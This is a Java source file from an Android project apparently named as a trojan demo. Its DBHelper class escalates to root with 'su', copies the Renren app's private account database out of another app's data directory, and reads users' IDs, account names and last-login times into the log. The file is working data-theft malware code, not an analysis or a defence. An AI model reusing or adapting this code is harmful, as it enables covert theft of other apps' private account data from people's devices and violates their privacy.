package com.singuloid.trojandemo.utils;

import android.app.ProgressDialog;
import android.content.Context;
import android.database.Cursor;
import android.database.DatabaseErrorHandler;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

/**
 * Created by administrator on 14-9-9.
 */
public class DBHelper extends SQLiteOpenHelper {

    private static final String TAG = "DBHelper";
    private static final String DIR = File.separator + "data" + File.separator + "data" + File.separator;
    private static final String RENREN_DB = DIR + "com.renren.mobile.android" + File.separator + "databases" + File.separator + "account.db";
    private static final String DB_NAME = "account.db";
    private static final String DB_TAL = "account";
    private Context mContext;

    public DBHelper(Context context) {
        super(context, DB_NAME, null, 1);
        this.mContext = context;

    }

    public DBHelper(Context context, String name, SQLiteDatabase.CursorFactory factory, int version) {
        super(context, name, factory, version);
    }

    public DBHelper(Context context, String name, SQLiteDatabase.CursorFactory factory, int version, DatabaseErrorHandler errorHandler) {
        super(context, name, factory, version, errorHandler);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {

    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {

    }

    public void queryAccount() {
        Cursor cursor = getDB().query(DB_TAL, new String[]{"uid", "account", "name", "last_login_time"}, null, null, null, null, null);
        if (cursor.moveToFirst()) {
            for (int i = 0; i < cursor.getCount(); i++) {
                cursor.move(i);
                String uid = cursor.getString(cursor.getColumnIndex("uid"));
                String account = cursor.getString(cursor.getColumnIndex("account"));
                String name = cursor.getString(cursor.getColumnIndex("name"));
                String last_login_time = cursor.getString(cursor.getColumnIndex("last_login_time"));
                Log.e(TAG, uid + account + name + last_login_time);
            }
        }
    }

    public SQLiteDatabase getDB() {

        DBHelper database = new DBHelper(mContext);

        Log.e(TAG, RENREN_DB);
        File dataBase = new File(RENREN_DB);
        if (dataBase.exists()) {

            Log.e(TAG, DIR + "com.singuloid.trojandemo" + File.separator + "databases" + File.separator + "account.db");
            File account = new File(DIR + "com.singuloid.trojandemo" + File.separator + "databases" + File.separator + "account.db");
            InputStream is = null;
            try {
                is = new FileInputStream(dataBase);
                FileOutputStream fos = new FileOutputStream(account);
                byte[] buffer = new byte[8192];
                int count = 0;
                while ((count = is.read(buffer)) != -1) {
                    fos.write(buffer, 0, count);
                }
                fos.close();
                is.close();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else {
            Log.e(TAG, "com.renren.mobil.android/databases/account.db can not be found!");
        }


        SQLiteDatabase db = null;
        db = database.getReadableDatabase();
        return db;
    }

    // 获取ROOT权限
    public void get_root(){

        if (is_root()){
            Toast.makeText(mContext, "已经具有ROOT权限!", Toast.LENGTH_LONG).show();
        }
        else{
            try{
                ProgressDialog progress_dialog = ProgressDialog.show(mContext,
                        "ROOT", "正在获取ROOT权限...", true, false);
                Runtime.getRuntime().exec("su");
            }
            catch (Exception e){
                Toast.makeText(mContext, "获取ROOT权限时出错!", Toast.LENGTH_LONG).show();
            }
        }

    }
    // 判断是否具有ROOT权限
    public static boolean is_root() {

        boolean res = false;

        try {
            if ((!new File("/system/bin/su").exists()) &&
                    (!new File("/system/xbin/su").exists())) {
                res = false;
            } else {
                res = true;
            }

        } catch (Exception e) {

        }
        return res;
    }
}
